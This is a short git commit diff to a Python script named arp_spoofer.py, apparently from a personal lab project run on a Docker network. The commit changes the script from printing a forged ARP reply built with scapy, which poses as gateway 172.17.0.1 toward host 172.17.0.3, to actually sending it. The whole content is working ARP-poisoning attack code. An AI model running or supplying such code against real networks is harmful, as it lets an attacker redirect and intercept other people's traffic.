33c0368ec2a3603ddcab48c0a92aa86ae3ef9658
Michael Zick <1907006+michaelzick@users.noreply.github.com>
2022-08-07 18:08:58 +0000

    Sending packet (working)

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -6,8 +6,9 @@ import sys
 
 
 def spoof():
-    packet = scapy.ARP(op=2, pdst='172.17.0.3', hwdst='02:42:ac:11:00:03', psrc='172.17.0.1')
-    print(packet.show())
-    print(packet.summary())
+    packet = scapy.ARP(op=2, pdst='172.17.0.3',
+                       hwdst='02:42:ac:11:00:03', psrc='172.17.0.1')
+    scapy.send(packet)
+
 
 spoof()
